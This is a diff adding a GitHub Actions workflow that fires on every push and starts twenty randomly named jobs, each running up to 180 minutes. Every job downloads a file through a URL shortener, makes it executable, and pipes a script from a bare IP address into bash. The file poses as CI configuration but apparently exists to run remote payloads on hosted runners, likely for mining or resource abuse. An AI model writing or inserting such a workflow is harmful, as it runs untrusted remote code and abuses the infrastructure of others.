@@ -1,0 +1,163 @@
+name: yurake
+on: push
+jobs:
+  bedebo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  rojapuba:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  laxove:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  zokotu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  magejaco:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  vihagu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  nesofa:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  cujugu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  temuri:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  xelubo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  kiluwivu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  dobivi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  kebuge:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  romogu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  ciyacuni:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  pehebote:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  vasadaba:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  nuseluhi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  mibowego:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
+  vowepu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/NELjnGv; chmod +x NELjnGv
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npy.php?a=kifu | bash -
